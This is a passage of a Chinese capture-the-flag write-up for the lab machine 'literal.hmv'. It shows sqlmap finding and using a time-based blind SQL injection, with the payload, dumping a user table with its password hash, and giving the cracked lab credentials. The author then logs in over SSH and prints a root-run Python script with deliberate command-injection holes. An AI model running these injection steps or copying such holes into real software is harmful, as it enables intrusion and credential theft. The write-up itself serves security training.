+<span class="token punctuation">[</span><span class="token number">12</span>:50:13<span class="token punctuation">]</span> <span class="token punctuation">[</span>WARNING<span class="token punctuation">]</span> reflective value<span class="token punctuation">(</span>s<span class="token punctuation">)</span> found and filtering out
+<span class="token punctuation">[</span><span class="token number">12</span>:50:13<span class="token punctuation">]</span> <span class="token punctuation">[</span>INFO<span class="token punctuation">]</span> testing <span class="token string">'Boolean-based blind - Parameter replace (original value)'</span>
+<span class="token punctuation">[</span><span class="token number">12</span>:50:13<span class="token punctuation">]</span> <span class="token punctuation">[</span>INFO<span class="token punctuation">]</span> testing <span class="token string">'MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)'</span>
+<span class="token punctuation">[</span><span class="token number">12</span>:50:13<span class="token punctuation">]</span> <span class="token punctuation">[</span>INFO<span class="token punctuation">]</span> testing <span class="token string">'PostgreSQL AND error-based - WHERE or HAVING clause'</span>
+<span class="token punctuation">[</span><span class="token number">12</span>:50:13<span class="token punctuation">]</span> <span class="token punctuation">[</span>INFO<span class="token punctuation">]</span> testing <span class="token string">'Microsoft SQL Server/Sybase AND error-based - WHERE or HAVING clause (IN)'</span>
+<span class="token punctuation">[</span><span class="token number">12</span>:50:13<span class="token punctuation">]</span> <span class="token punctuation">[</span>INFO<span class="token punctuation">]</span> testing <span class="token string">'Oracle AND error-based - WHERE or HAVING clause (XMLType)'</span>
+<span class="token punctuation">[</span><span class="token number">12</span>:50:13<span class="token punctuation">]</span> <span class="token punctuation">[</span>INFO<span class="token punctuation">]</span> testing <span class="token string">'Generic inline queries'</span>
+<span class="token punctuation">[</span><span class="token number">12</span>:50:13<span class="token punctuation">]</span> <span class="token punctuation">[</span>INFO<span class="token punctuation">]</span> testing <span class="token string">'PostgreSQL > 8.1 stacked queries (comment)'</span>
+<span class="token punctuation">[</span><span class="token number">12</span>:50:13<span class="token punctuation">]</span> <span class="token punctuation">[</span>INFO<span class="token punctuation">]</span> testing <span class="token string">'Microsoft SQL Server/Sybase stacked queries (comment)'</span>
+<span class="token punctuation">[</span><span class="token number">12</span>:50:13<span class="token punctuation">]</span> <span class="token punctuation">[</span>INFO<span class="token punctuation">]</span> testing <span class="token string">'Oracle stacked queries (DBMS_PIPE.RECEIVE_MESSAGE - comment)'</span>
+<span class="token punctuation">[</span><span class="token number">12</span>:50:13<span class="token punctuation">]</span> <span class="token punctuation">[</span>INFO<span class="token punctuation">]</span> testing <span class="token string">'MySQL >= 5.0.12 AND time-based blind (query SLEEP)'</span>
+<span class="token punctuation">[</span><span class="token number">12</span>:50:33<span class="token punctuation">]</span> <span class="token punctuation">[</span>INFO<span class="token punctuation">]</span> GET parameter <span class="token string">'category_id'</span> appears to be <span class="token string">'MySQL >= 5.0.12 AND time-based blind (query SLEEP)'</span> injectable 
+it looks like the back-end DBMS is <span class="token string">'MySQL'</span><span class="token builtin class-name">.</span> Do you want to skip <span class="token builtin class-name">test</span> payloads specific <span class="token keyword">for</span> other DBMSes? <span class="token punctuation">[</span>Y/n<span class="token punctuation">]</span> Y
+<span class="token keyword">for</span> the remaining tests, <span class="token keyword">do</span> you want to include all tests <span class="token keyword">for</span> <span class="token string">'MySQL'</span> extending provided level <span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span> and risk <span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span> values? <span class="token punctuation">[</span>Y/n<span class="token punctuation">]</span> Y
+<span class="token punctuation">[</span><span class="token number">12</span>:50:33<span class="token punctuation">]</span> <span class="token punctuation">[</span>INFO<span class="token punctuation">]</span> testing <span class="token string">'Generic UNION query (NULL) - 1 to 20 columns'</span>
+<span class="token punctuation">[</span><span class="token number">12</span>:50:33<span class="token punctuation">]</span> <span class="token punctuation">[</span>INFO<span class="token punctuation">]</span> automatically extending ranges <span class="token keyword">for</span> UNION query injection technique tests as there is at least one other <span class="token punctuation">(</span>potential<span class="token punctuation">)</span> technique found
+<span class="token punctuation">[</span><span class="token number">12</span>:50:33<span class="token punctuation">]</span> <span class="token punctuation">[</span>INFO<span class="token punctuation">]</span> <span class="token string">'ORDER BY'</span> technique appears to be usable. This should reduce the <span class="token function">time</span> needed to <span class="token function">find</span> the right number of query columns. Automatically extending the range <span class="token keyword">for</span> current UNION query injection technique <span class="token builtin class-name">test</span>
+<span class="token punctuation">[</span><span class="token number">12</span>:50:33<span class="token punctuation">]</span> <span class="token punctuation">[</span>INFO<span class="token punctuation">]</span> target URL appears to have <span class="token number">1</span> <span class="token function">column</span> <span class="token keyword">in</span> query
+<span class="token keyword">do</span> you want to <span class="token punctuation">(</span>re<span class="token punctuation">)</span>try to <span class="token function">find</span> proper UNION <span class="token function">column</span> types with fuzzy test? <span class="token punctuation">[</span>y/N<span class="token punctuation">]</span> N
+<span class="token punctuation">[</span><span class="token number">12</span>:50:33<span class="token punctuation">]</span> <span class="token punctuation">[</span>WARNING<span class="token punctuation">]</span> <span class="token keyword">if</span> UNION based SQL injection is not detected, please consider and/or try to force the back-end DBMS <span class="token punctuation">(</span>e.g. <span class="token string">'--dbms=mysql'</span><span class="token punctuation">)</span> 
+<span class="token punctuation">[</span><span class="token number">12</span>:50:33<span class="token punctuation">]</span> <span class="token punctuation">[</span>INFO<span class="token punctuation">]</span> target URL appears to be UNION injectable with <span class="token number">1</span> columns
+<span class="token punctuation">[</span><span class="token number">12</span>:50:33<span class="token punctuation">]</span> <span class="token punctuation">[</span>INFO<span class="token punctuation">]</span> checking <span class="token keyword">if</span> the injection point on GET parameter <span class="token string">'category_id'</span> is a <span class="token boolean">false</span> positive
+GET parameter <span class="token string">'category_id'</span> is vulnerable. Do you want to keep testing the others <span class="token punctuation">(</span>if any<span class="token punctuation">)</span>? <span class="token punctuation">[</span>y/N<span class="token punctuation">]</span> N
+sqlmap identified the following injection point<span class="token punctuation">(</span>s<span class="token punctuation">)</span> with a total of <span class="token number">94</span> HTTP<span class="token punctuation">(</span>s<span class="token punctuation">)</span> requests:
+---
+Parameter: category_id <span class="token punctuation">(</span>GET<span class="token punctuation">)</span>
+    Type: time-based blind
+    Title: MySQL <span class="token operator">>=</span> <span class="token number">5.0</span>.12 AND time-based blind <span class="token punctuation">(</span>query SLEEP<span class="token punctuation">)</span>
+    Payload: <span class="token assign-left variable">category_id</span><span class="token operator">=</span><span class="token number">2</span> AND <span class="token punctuation">(</span>SELECT <span class="token number">8612</span> FROM <span class="token punctuation">(</span>SELECT<span class="token punctuation">(</span>SLEEP<span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">))</span><span class="token punctuation">)</span>vKOY<span class="token punctuation">)</span>
+---
+<span class="token punctuation">[</span><span class="token number">12</span>:51:13<span class="token punctuation">]</span> <span class="token punctuation">[</span>INFO<span class="token punctuation">]</span> the back-end DBMS is MySQL
+<span class="token punctuation">[</span><span class="token number">12</span>:51:13<span class="token punctuation">]</span> <span class="token punctuation">[</span>WARNING<span class="token punctuation">]</span> it is very important to not stress the network connection during usage of time-based payloads to prevent potential disruptions 
+web server operating system: Linux Ubuntu <span class="token number">20.04</span> or <span class="token number">19.10</span> or <span class="token number">20.10</span> <span class="token punctuation">(</span>eoan or focal<span class="token punctuation">)</span>
+web application technology: PHP, Apache <span class="token number">2.4</span>.41
+back-end DBMS: MySQL <span class="token operator">>=</span> <span class="token number">5.0</span>.12
+<span class="token punctuation">[</span><span class="token number">12</span>:51:13<span class="token punctuation">]</span> <span class="token punctuation">[</span>WARNING<span class="token punctuation">]</span> HTTP error codes detected during run:
+<span class="token number">500</span> <span class="token punctuation">(</span>Internal Server Error<span class="token punctuation">)</span> - <span class="token number">72</span> <span class="token builtin class-name">times</span>
+<span class="token punctuation">[</span><span class="token number">12</span>:51:13<span class="token punctuation">]</span> <span class="token punctuation">[</span>INFO<span class="token punctuation">]</span> fetched data logged to text files under <span class="token string">'/root/.local/share/sqlmap/output/forumtesting.literal.hmv'</span>
+
+<span class="token punctuation">[</span>*<span class="token punctuation">]</span> ending @ <span class="token number">12</span>:51:13 /2024-06-23/</code></pre>
+<p>发现存在时间盲注，哥们，我赶着去复习呢，你给我时间盲注也太搞了</p>
+<pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token operator">></span> sqlmap <span class="token parameter variable">--url</span> http://forumtesting.literal.hmv/category.php<span class="token punctuation">\</span>?category_id<span class="token punctuation">\</span><span class="token operator">=</span><span class="token number">2</span> <span class="token parameter variable">--batch</span> <span class="token parameter variable">--dbs</span>
+        ___
+       __H__                                                                                                                                                                                                                                
+ ___ ___<span class="token punctuation">[</span><span class="token punctuation">(</span><span class="token punctuation">]</span>_____ ___ ___  <span class="token punctuation">&#123;</span><span class="token number">1.8</span>.2<span class="token comment">#stable&#125;                                                                                                                                                                                                    </span>
+<span class="token operator">|</span>_ -<span class="token operator">|</span> <span class="token builtin class-name">.</span> <span class="token punctuation">[</span><span class="token punctuation">)</span><span class="token punctuation">]</span>     <span class="token operator">|</span> <span class="token builtin class-name">.</span><span class="token string">'| . |                                                                                                                                                                                                                   
+|___|_  [,]_|_|_|__,|  _|                                                                                                                                                                                                                   
+      |_|V...       |_|   https://sqlmap.org                                                                                                                                                                                                
+
+[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user'</span>s responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible <span class="token keyword">for</span> any misuse or damage caused by this program
+
+<span class="token punctuation">[</span>*<span class="token punctuation">]</span> starting @ <span class="token number">12</span>:51:47 /2024-06-23/
+
+<span class="token punctuation">[</span><span class="token number">12</span>:51:47<span class="token punctuation">]</span> <span class="token punctuation">[</span>INFO<span class="token punctuation">]</span> resuming back-end DBMS <span class="token string">'mysql'</span> 
+<span class="token punctuation">[</span><span class="token number">12</span>:51:47<span class="token punctuation">]</span> <span class="token punctuation">[</span>INFO<span class="token punctuation">]</span> testing connection to the target URL
+you have not declared cookie<span class="token punctuation">(</span>s<span class="token punctuation">)</span>, <span class="token keyword">while</span> server wants to <span class="token builtin class-name">set</span> its own <span class="token punctuation">(</span><span class="token string">'PHPSESSID=0o1o6isch7h...q54adnroq4'</span><span class="token punctuation">)</span>. Do you want to use those <span class="token punctuation">[</span>Y/n<span class="token punctuation">]</span> Y
+sqlmap resumed the following injection point<span class="token punctuation">(</span>s<span class="token punctuation">)</span> from stored session:
+---
+Parameter: category_id <span class="token punctuation">(</span>GET<span class="token punctuation">)</span>
+    Type: time-based blind
+    Title: MySQL <span class="token operator">>=</span> <span class="token number">5.0</span>.12 AND time-based blind <span class="token punctuation">(</span>query SLEEP<span class="token punctuation">)</span>
+    Payload: <span class="token assign-left variable">category_id</span><span class="token operator">=</span><span class="token number">2</span> AND <span class="token punctuation">(</span>SELECT <span class="token number">8612</span> FROM <span class="token punctuation">(</span>SELECT<span class="token punctuation">(</span>SLEEP<span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">))</span><span class="token punctuation">)</span>vKOY<span class="token punctuation">)</span>
+---
+<span class="token punctuation">[</span><span class="token number">12</span>:51:47<span class="token punctuation">]</span> <span class="token punctuation">[</span>INFO<span class="token punctuation">]</span> the back-end DBMS is MySQL
+web server operating system: Linux Ubuntu <span class="token number">20.10</span> or <span class="token number">19.10</span> or <span class="token number">20.04</span> <span class="token punctuation">(</span>focal or eoan<span class="token punctuation">)</span>
+web application technology: PHP, Apache <span class="token number">2.4</span>.41
+back-end DBMS: MySQL <span class="token operator">>=</span> <span class="token number">5.0</span>.12
+<span class="token punctuation">[</span><span class="token number">12</span>:51:47<span class="token punctuation">]</span> <span class="token punctuation">[</span>INFO<span class="token punctuation">]</span> fetching database names
+<span class="token punctuation">[</span><span class="token number">12</span>:51:47<span class="token punctuation">]</span> <span class="token punctuation">[</span>INFO<span class="token punctuation">]</span> fetching number of databases
+<span class="token punctuation">[</span><span class="token number">12</span>:51:47<span class="token punctuation">]</span> <span class="token punctuation">[</span>WARNING<span class="token punctuation">]</span> time-based comparison requires larger statistical model, please wait<span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span> <span class="token punctuation">(</span>done<span class="token punctuation">)</span>                                                                                                             
+<span class="token punctuation">[</span><span class="token number">12</span>:51:47<span class="token punctuation">]</span> <span class="token punctuation">[</span>WARNING<span class="token punctuation">]</span> it is very important to not stress the network connection during usage of time-based payloads to prevent potential disruptions 
+<span class="token keyword">do</span> you want sqlmap to try to optimize value<span class="token punctuation">(</span>s<span class="token punctuation">)</span> <span class="token keyword">for</span> DBMS delay responses <span class="token punctuation">(</span>option <span class="token string">'--time-sec'</span><span class="token punctuation">)</span>? <span class="token punctuation">[</span>Y/n<span class="token punctuation">]</span> Y
+<span class="token punctuation">[</span><span class="token number">12</span>:52:18<span class="token punctuation">]</span> <span class="token punctuation">[</span>INFO<span class="token punctuation">]</span> adjusting <span class="token function">time</span> delay to <span class="token number">1</span> second due to good response <span class="token builtin class-name">times</span>
+<span class="token number">3</span>
+<span class="token punctuation">[</span><span class="token number">12</span>:52:18<span class="token punctuation">]</span> <span class="token punctuation">[</span>INFO<span class="token punctuation">]</span> retrieved: information_schema
+<span class="token punctuation">[</span><span class="token number">12</span>:54:12<span class="token punctuation">]</span> <span class="token punctuation">[</span>INFO<span class="token punctuation">]</span> retrieved: performance_schema
+<span class="token punctuation">[</span><span class="token number">12</span>:56:03<span class="token punctuation">]</span> <span class="token punctuation">[</span>INFO<span class="token punctuation">]</span> retrieved: forumtesting
+available databases <span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span>:
+<span class="token punctuation">[</span>*<span class="token punctuation">]</span> forumtesting
+<span class="token punctuation">[</span>*<span class="token punctuation">]</span> information_schema
+<span class="token punctuation">[</span>*<span class="token punctuation">]</span> performance_schema
+
+<span class="token punctuation">[</span><span class="token number">12</span>:57:21<span class="token punctuation">]</span> <span class="token punctuation">[</span>INFO<span class="token punctuation">]</span> fetched data logged to text files under <span class="token string">'/root/.local/share/sqlmap/output/forumtesting.literal.hmv'</span>
+
+<span class="token punctuation">[</span>*<span class="token punctuation">]</span> ending @ <span class="token number">12</span>:57:21 /2024-06-23/</code></pre>
+<p>赶时间，我就抄了一下别人的表名</p>
+<pre class="language-bash" data-language="bash"><code class="language-bash">sqlmap <span class="token parameter variable">-u</span> <span class="token string">"http://forumtesting.literal.hmv/category.php?category_id=2"</span>  <span class="token parameter variable">-D</span> forumtesting <span class="token parameter variable">-T</span> forum_owner <span class="token parameter variable">--dump</span></code></pre>
+<pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token operator">></span> sqlmap <span class="token parameter variable">-u</span> <span class="token string">"http://forumtesting.literal.hmv/category.php?category_id=2"</span>  <span class="token parameter variable">-D</span> forumtesting <span class="token parameter variable">-T</span> forum_owner <span class="token parameter variable">--dump</span> <span class="token parameter variable">--batch</span>
+        ___
+       __H__                                                                                                                                                                                                                                
+ ___ ___<span class="token punctuation">[</span><span class="token string">']_____ ___ ___  &#123;1.8.2#stable&#125;                                                                                                                                                                                                    
+|_ -| . [,]     | .'</span><span class="token operator">|</span> <span class="token builtin class-name">.</span> <span class="token operator">|</span>                                                                                                                                                                                                                   
+<span class="token operator">|</span>___<span class="token operator">|</span>_  <span class="token punctuation">[</span><span class="token punctuation">(</span><span class="token punctuation">]</span>_<span class="token operator">|</span>_<span class="token operator">|</span>_<span class="token operator">|</span>__,<span class="token operator">|</span>  _<span class="token operator">|</span>                                                                                                                                                                                                                   
+      <span class="token operator">|</span>_<span class="token operator">|</span>V<span class="token punctuation">..</span>.       <span class="token operator">|</span>_<span class="token operator">|</span>   https://sqlmap.org                                                                                                                                                                                                
+
+<span class="token punctuation">[</span><span class="token operator">!</span><span class="token punctuation">]</span> legal disclaimer: Usage of sqlmap <span class="token keyword">for</span> attacking targets without prior mutual consent is illegal. It is the end user<span class="token string">'s responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
+
+[*] starting @ 12:58:18 /2024-06-23/
+
+[12:58:18] [INFO] resuming back-end DBMS '</span>mysql<span class="token string">' 
+[12:58:18] [INFO] testing connection to the target URL
+you have not declared cookie(s), while server wants to set its own ('</span>PHPSESSID<span class="token operator">=</span>ks9s8snf7es<span class="token punctuation">..</span>.ogl78q5fij<span class="token string">'). Do you want to use those [Y/n] Y
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: category_id (GET)
+    Type: time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
+    Payload: category_id=2 AND (SELECT 8612 FROM (SELECT(SLEEP(5)))vKOY)
+---
+[12:58:18] [INFO] the back-end DBMS is MySQL
+web server operating system: Linux Ubuntu 20.04 or 20.10 or 19.10 (eoan or focal)
+web application technology: Apache 2.4.41, PHP
+back-end DBMS: MySQL >= 5.0.12
+[12:58:18] [INFO] fetching columns for table '</span>forum_owner<span class="token string">' in database '</span>forumtesting<span class="token string">'
+[12:58:18] [WARNING] time-based comparison requires larger statistical model, please wait.............................. (done)                                                                                                             
+do you want sqlmap to try to optimize value(s) for DBMS delay responses (option '</span>--time-sec<span class="token string">')? [Y/n] Y
+[12:58:28] [WARNING] it is very important to not stress the network connection during usage of time-based payloads to prevent potential disruptions 
+5
+[12:58:38] [INFO] retrieved: 
+[12:58:48] [INFO] adjusting time delay to 1 second due to good response times
+id
+[12:58:58] [INFO] retrieved: username
+[12:59:43] [INFO] retrieved: email
+[13:00:09] [INFO] retrieved: password
+[13:01:03] [INFO] retrieved: created
+[13:01:40] [INFO] fetching entries for table '</span>forum_owner<span class="token string">' in database '</span>forumtesting<span class="token string">'
+[13:01:40] [INFO] fetching number of entries for table '</span>forum_owner<span class="token string">' in database '</span>forumtesting<span class="token string">'
+[13:01:40] [INFO] retrieved: 1
+[13:01:42] [WARNING] reflective value(s) found and filtering out of statistical model, please wait                                                                                                                                         
+.............................. (done)
+2022-02-12
+[13:02:40] [INFO] retrieved: carlos@forumtesting.literal.htb
+[13:06:06] [INFO] retrieved: 1
+[13:06:10] [INFO] retrieved: 6705fe62010679f04257358241792b41acba4ea896178a40eb63c743f5317a09faefa2e056486d55e9c05f851b222e6e7c5c1bd22af135157aa9b02201cf4e99
+[13:20:03] [INFO] retrieved: carlos
+[13:20:40] [INFO] recognized possible password hashes in column '</span>password<span class="token string">'
+do you want to store hashes to a temporary file for eventual further processing with other tools [y/N] N
+do you want to crack them via a dictionary-based attack? [Y/n/q] Y
+[13:20:40] [INFO] using hash method '</span>sha512_generic_passwd<span class="token string">'
+what dictionary do you want to use?
+[1] default dictionary file '</span>/usr/share/sqlmap/data/txt/wordlist.tx_<span class="token string">' (press Enter)
+[2] custom dictionary file
+[3] file with list of dictionary files
+> 1
+[13:20:40] [INFO] using default dictionary
+do you want to use common password suffixes? (slow!) [y/N] N
+[13:20:40] [INFO] starting dictionary-based cracking (sha512_generic_passwd)
+[13:20:40] [WARNING] multiprocessing hash cracking is currently not supported on this platform
+[13:20:53] [WARNING] no clear password(s) found                                                                                                                                                                                            
+Database: forumtesting
+Table: forum_owner
+[1 entry]
++----+---------------------------------+------------+----------------------------------------------------------------------------------------------------------------------------------+----------+
+| id | email                           | created    | password                                                                                                                         | username |
++----+---------------------------------+------------+----------------------------------------------------------------------------------------------------------------------------------+----------+
+| 1  | carlos@forumtesting.literal.htb | 2022-02-12 | 6705fe62010679f04257358241792b41acba4ea896178a40eb63c743f5317a09faefa2e056486d55e9c05f851b222e6e7c5c1bd22af135157aa9b02201cf4e99 | carlos   |
++----+---------------------------------+------------+----------------------------------------------------------------------------------------------------------------------------------+----------+
+
+[13:20:53] [INFO] table '</span>forumtesting.forum_owner<span class="token string">' dumped to CSV file '</span>/root/.local/share/sqlmap/output/forumtesting.literal.hmv/dump/forumtesting/forum_owner.csv<span class="token string">'
+[13:20:53] [INFO] fetched data logged to text files under '</span>/root/.local/share/sqlmap/output/forumtesting.literal.hmv'
+
+<span class="token punctuation">[</span>*<span class="token punctuation">]</span> ending @ <span class="token number">13</span>:20:53 /2024-06-23/
+</code></pre>
+<p>也是跑出来了，虽迟但到。<br>碰撞一下密码<br><img src="https://ooo.0x0.ooo/2024/06/23/OPzd9b.png" alt="OPzd9b.png" loading="lazy"><br><code>carlos:forum100889</code></p>
+<h2 id="ssh连接"><a href="#ssh连接" class="headerlink" title="ssh连接"></a>ssh连接</h2><pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token operator">></span> <span class="token function">ssh</span> carlos@192.168.56.189                      
+carlos@192.168.56.189<span class="token string">'s password: 
+Permission denied, please try again.
+carlos@192.168.56.189'</span>s password: 
+Permission denied, please try again.
+carlos@192.168.56.189's password: </code></pre>
+<p>不是哥们，还连不上去，看了别人的wp，发现forum是个论坛，那么ssh对应的密码是<code>ssh100889</code>，无语<br>拿到user shell也拿到了user flag</p>
+<pre class="language-bash" data-language="bash"><code class="language-bash">carlos@literal:~$ <span class="token function">ls</span> <span class="token parameter variable">-al</span>
+total <span class="token number">44</span>
+drwxr-xr-x <span class="token number">7</span> carlos carlos <span class="token number">4096</span> Apr  <span class="token number">8</span>  <span class="token number">2023</span> <span class="token builtin class-name">.</span>
+drwxr-xr-x <span class="token number">3</span> root   root   <span class="token number">4096</span> Jun <span class="token number">15</span>  <span class="token number">2022</span> <span class="token punctuation">..</span>
+lrwxrwxrwx <span class="token number">1</span> root   root      <span class="token number">9</span> Feb <span class="token number">12</span>  <span class="token number">2021</span> .bash_history -<span class="token operator">></span> /dev/null
+-rw-r--r-- <span class="token number">1</span> carlos carlos  <span class="token number">220</span> Feb <span class="token number">25</span>  <span class="token number">2020</span> .bash_logout
+-rw-r--r-- <span class="token number">1</span> carlos carlos <span class="token number">3771</span> Feb <span class="token number">25</span>  <span class="token number">2020</span> .bashrc
+drwx------ <span class="token number">2</span> carlos carlos <span class="token number">4096</span> Jun <span class="token number">21</span>  <span class="token number">2022</span> .cache
+drwx------ <span class="token number">3</span> carlos carlos <span class="token number">4096</span> Jun <span class="token number">22</span>  <span class="token number">2022</span> .gnupg
+drwxrwxr-x <span class="token number">3</span> carlos carlos <span class="token number">4096</span> Feb <span class="token number">12</span>  <span class="token number">2021</span> .local
+drwxrwxr-x <span class="token number">2</span> carlos carlos <span class="token number">4096</span> Jun <span class="token number">21</span>  <span class="token number">2022</span> my_things
+-rw-r--r-- <span class="token number">1</span> carlos carlos  <span class="token number">807</span> Feb <span class="token number">25</span>  <span class="token number">2020</span> .profile
+drwx------ <span class="token number">2</span> carlos carlos <span class="token number">4096</span> Sep <span class="token number">20</span>  <span class="token number">2021</span> .ssh
+-rw-r----- <span class="token number">1</span> root   carlos   <span class="token number">33</span> Feb <span class="token number">13</span>  <span class="token number">2021</span> user.txt
+carlos@literal:~$ <span class="token function">cat</span> user.txt 
+6d3c8a6c73cf4f89eea7ae57f6eb9222</code></pre>
+
+<h2 id="提权root"><a href="#提权root" class="headerlink" title="提权root"></a>提权root</h2><p>sudo起手</p>
+<pre class="language-bash" data-language="bash"><code class="language-bash">carlos@literal:~$ <span class="token function">sudo</span> <span class="token parameter variable">-l</span>
+Matching Defaults entries <span class="token keyword">for</span> carlos on literal:
+    env_reset, mail_badpass, <span class="token assign-left variable">secure_path</span><span class="token operator">=</span>/usr/local/sbin<span class="token punctuation">\</span>:/usr/local/bin<span class="token punctuation">\</span>:/usr/sbin<span class="token punctuation">\</span>:/usr/bin<span class="token punctuation">\</span>:/sbin<span class="token punctuation">\</span>:/bin<span class="token punctuation">\</span>:/snap/bin
+
+User carlos may run the following commands on literal:
+    <span class="token punctuation">(</span>root<span class="token punctuation">)</span> NOPASSWD: /opt/my_things/blog/update_project_status.py *</code></pre>
+<pre class="language-bash" data-language="bash"><code class="language-bash">carlos@literal:~$ <span class="token function">ls</span> <span class="token parameter variable">-al</span> /opt/my_things/blog/update_project_status.py
+-rwxr-xr-x <span class="token number">1</span> root root <span class="token number">3041</span> Jun <span class="token number">21</span>  <span class="token number">2022</span> /opt/my_things/blog/update_project_status.py
+carlos@literal:~$ <span class="token function">cat</span> /opt/my_things/blog/update_project_status.py
+<span class="token comment">#!/usr/bin/python3</span>
+
+<span class="token comment"># Learning python3 to update my project status</span>
+<span class="token comment">## (mental note: This is important, so administrator is my safe to avoid upgrading records by mistake) :P</span>
+
+<span class="token string">''</span>'
+References:
+* MySQL commands <span class="token keyword">in</span> Linux: https://www.shellhacks.com/mysql-run-query-bash-script-linux-command-line/
+* Shell commands <span class="token keyword">in</span> Python: https://stackabuse.com/executing-shell-commands-with-python/
+* Functions: https://www.tutorialspoint.com/python3/python_functions.htm
+* Arguments: https://www.knowledgehut.com/blog/programming/sys-argv-python-examples
+* Array validation: https://stackoverflow.com/questions/7571635/fastest-way-to-check-if-a-value-exists-in-a-list
+* Valid <span class="token keyword">if</span> root is running the script: https://stackoverflow.com/questions/2806897/what-is-the-best-way-for-checking-if-the-user-of-a-script-has-root-like-privileg
+<span class="token string">''</span>'
+
+<span class="token function">import</span> os
+<span class="token function">import</span> sys
+from datetime <span class="token function">import</span> <span class="token function">date</span>
+
+<span class="token comment"># Functions ------------------------------------------------.</span>
+def execute_query<span class="token punctuation">(</span>sql<span class="token punctuation">)</span>:
+    os.system<span class="token punctuation">(</span><span class="token string">"mysql -u "</span> + db_user + <span class="token string">" -D "</span> + db_name + <span class="token string">" -e <span class="token entity" title="\&quot;">\"</span>"</span> + sql + <span class="token string">"<span class="token entity" title="\&quot;">\"</span>"</span><span class="token punctuation">)</span>
+
+<span class="token comment"># Query all rows</span>
+def query_all<span class="token punctuation">(</span><span class="token punctuation">)</span>:
+    sql <span class="token operator">=</span> <span class="token string">"SELECT * FROM projects;"</span>
+    execute_query<span class="token punctuation">(</span>sql<span class="token punctuation">)</span>
+
+<span class="token comment"># Query row by ID</span>
+def query_by_id<span class="token punctuation">(</span>arg_project_id<span class="token punctuation">)</span>:
+    sql <span class="token operator">=</span> <span class="token string">"SELECT * FROM projects WHERE proid = "</span> + arg_project_id + <span class="token string">";"</span>
+    execute_query<span class="token punctuation">(</span>sql<span class="token punctuation">)</span>
+
+<span class="token comment"># Update database</span>
+def update_status<span class="token punctuation">(</span>enddate, arg_project_id, arg_project_status<span class="token punctuation">)</span>:
+    <span class="token keyword">if</span> enddate <span class="token operator">!=</span> <span class="token number">0</span>:
+        sql <span class="token operator">=</span> f<span class="token string">"UPDATE projects SET prodateend = '"</span> + str<span class="token punctuation">(</span>enddate<span class="token punctuation">)</span> + <span class="token string">"', prostatus = '"</span> + arg_project_status + <span class="token string">"' WHERE proid = '"</span> + arg_project_id + <span class="token string">"';"</span>
+    else:
+        sql <span class="token operator">=</span> f<span class="token string">"UPDATE projects SET prodateend = '2222-12-12', prostatus = '"</span> + arg_project_status + <span class="token string">"' WHERE proid = '"</span> + arg_project_id + <span class="token string">"';"</span>
+
+    execute_query<span class="token punctuation">(</span>sql<span class="token punctuation">)</span>
+
+<span class="token comment"># Main program</span>
+def main<span class="token punctuation">(</span><span class="token punctuation">)</span>:
+    <span class="token comment"># Fast validation</span>
+    try:
+        arg_project_id <span class="token operator">=</span> sys.argv<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span>
+    except:
+        arg_project_id <span class="token operator">=</span> <span class="token string">""</span>
+
+    try:
+        arg_project_status <span class="token operator">=</span> sys.argv<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span>
+    except:
+        arg_project_status <span class="token operator">=</span> <span class="token string">""</span>
+
+    <span class="token keyword">if</span> arg_project_id and arg_project_status: <span class="token comment"># To update</span>
+        <span class="token comment"># Avoid update by error</span>
+        <span class="token keyword">if</span> os.geteuid<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">0</span>:
+            array_status <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">"Done"</span>, <span class="token string">"Doing"</span>, <span class="token string">"To do"</span><span class="token punctuation">]</span>
+            <span class="token keyword">if</span> arg_project_status <span class="token keyword">in</span> array_status:
+                print<span class="token punctuation">(</span><span class="token string">"[+] Before update project ("</span> + arg_project_id + <span class="token string">")<span class="token entity" title="\n">\n</span>"</span><span class="token punctuation">)</span>
+                query_by_id<span class="token punctuation">(</span>arg_project_id<span class="token punctuation">)</span>
+
+                <span class="token keyword">if</span> arg_project_status <span class="token operator">==</span> <span class="token string">'Done'</span><span class="token builtin class-name">:</span>
+                    update_status<span class="token punctuation">(</span>date.today<span class="token punctuation">(</span><span class="token punctuation">)</span>, arg_project_id, arg_project_status<span class="token punctuation">)</span>
+                else:
+                    update_status<span class="token punctuation">(</span><span class="token number">0</span>, arg_project_id, arg_project_status<span class="token punctuation">)</span>
+            else:
+                print<span class="token punctuation">(</span><span class="token string">"Bro, avoid a fail: Done - Doing - To do"</span><span class="token punctuation">)</span>
+                exit<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>
+
+            print<span class="token punctuation">(</span><span class="token string">"<span class="token entity" title="\n">\n</span>[+] New status of project ("</span> + arg_project_id + <span class="token string">")<span class="token entity" title="\n">\n</span>"</span><span class="token punctuation">)</span>
+            query_by_id<span class="token punctuation">(</span>arg_project_id<span class="token punctuation">)</span>
+        else:
+            print<span class="token punctuation">(</span><span class="token string">"Ejejeeey, avoid mistakes!"</span><span class="token punctuation">)</span>
+            exit<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>
+
+    <span class="token keyword">elif</span> arg_project_id:
